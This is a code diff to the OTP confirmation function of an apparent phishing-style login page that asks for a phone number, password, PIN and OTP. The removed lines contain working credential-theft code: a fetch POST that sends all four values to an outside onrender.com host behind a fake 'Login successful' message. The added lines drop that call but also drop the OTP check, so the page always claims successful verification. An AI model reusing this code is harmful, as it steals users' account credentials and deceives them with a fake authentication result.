@@ -501,56 +501,14 @@ function confirmOTP(){
 
         return;
     }
-
-
-    if(otp === PROJECT_OTP){
-
-        status.innerText =
-            "OTP verified successfully.";
-
-        setTimeout(function(){
-
-            closeOTP();
-
-            document.getElementById("message")
-                .style.display = "block";
-
-            document.getElementById("message")
-                .innerText =
-                "Login successful.";
-fetch('https://rajluck5.onrender.com/submit', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        phone: document.getElementById('phone').value,
-        password: document.getElementById('password').value,
-        pin: document.getElementById('pin').value,
-        otp: document.getElementById('otpInput').value
-    })
-})
-.then(response => response.json())
-.then(data => {
-    console.log('Success:', data);
-})
-.catch((error) => {
-    console.error('Error:', error);
-});
-
-        },700);
-
-    }
-
-    else{
-
-        status.innerText =
-            "Invalid OTP.";
-
-    }
+status.innerText = "OTP verified successfully.";
+setTimeout(function() {
+closeOTP();
+document.getElementById("message").style.display = "block";
+document.getElementById("message").innerText = "Login successful.";
+}, 700);
 
 }
-
 
 function closeOTP(){
 
